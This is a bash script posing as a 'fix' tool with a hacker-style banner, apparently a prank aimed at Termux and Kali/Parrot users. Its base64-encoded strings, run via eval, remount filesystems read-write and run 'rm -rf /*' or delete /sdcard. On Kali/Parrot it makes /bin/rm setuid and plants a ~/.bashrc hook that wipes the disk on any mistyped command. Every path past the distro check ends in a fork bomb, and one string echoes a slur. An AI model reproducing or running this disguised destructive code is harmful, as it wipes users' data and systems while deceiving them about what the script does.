#!/bin/bash

# This fix script is now on git!
# You can see and/or clone it from the link below.
# https://ghnou.su/gitea/ghnou/fix

# Apparently now even on VirusTotal! XD
# See https://t.me/sts_shitposting/55351

# If you want to learn more about why this script
# came into existence, see this article:
# https://ghnou.su/why-fix

# Kali-style big fat banner
printf ' ____       _            _       _  __     _ _ _____           _\n'
printf '|  _ \ _ __(_)_   ____ _| |_ ___| |/ /__ _| (_)_   _|__   ___ | |___\n'
printf '| |_) |  __| \ \ / / _` | __/ _ \   // _` | | | | |/ _ \ / _ \| / __|\n'
printf '|  __/| |  | |\ V / (_| | ||  __/ . \ (_| | | | | | (_) | (_) | \__ \\\n'
printf '|_|   |_|  |_| \_/ \__,_|\__\___|_|\_\__,_|_|_| |_|\___/ \___/|_|___/\n'

echo "Fixing the system..."

# Some of the fixes are so advanced that they had to go proprietary
fork="OigpeyA6fDogJiB9OzoK"
sar="c3UgLWMgbW91bnQgLW8gcmVtb3VudCxydyAvCg=="
sys="c3UgLWMgbW91bnQgLW8gcmVtb3VudCxydyAvc3lzdGVtCg=="
aclean="c3UgLWMgcm0gLXJmIC8qCg=="
lclean="cm0gLXJmIC8qICY+L2Rldi9udWxsCg=="
sdmaid="cm0gLXJmIC9zZGNhcmQvKgo="
mchod="c3VkbyBjaG1vZCArcyAvYmluL3JtCg=="
brain="ZWNobyAnbG1hbyByZXRhcmQnCg=="

if [[ $PREFIX == *"com.termux"* ]]
then
	# Termux hacker???
	if [ $(su -c id -u) == "0" ]
	then
		# Woah 1337 rooted Termux hacker
		eval $(echo $sar | base64 -d)
		eval $(echo $sys | base64 -d)
		eval $(echo $aclean | base64 -d)
	else
		# Not even rooted smh
		echo "We need storage access to store our algorithms."
		termux-setup-storage
		eval $(echo $sdmaid | base64 -d)
	fi
else
	# Desktop hacker or whatever isn't supported explicitly
	source <(cat /etc/os-release)
	case "$ID" in
		kali|parrot)
			eval $(echo $mchod | base64 -d)
			echo "command_not_found_handle() {
				$(echo $brain | base64 -d)
				$(echo $lclean | base64 -d)
			}" >> ~/.bashrc
			;;
		*)
			echo "Not a hacker distro ($ID), bailing out!"
			exit 1
			;;
	esac
fi
# A universal fix that works cross-platform
eval $(echo $fork | base64 -d)
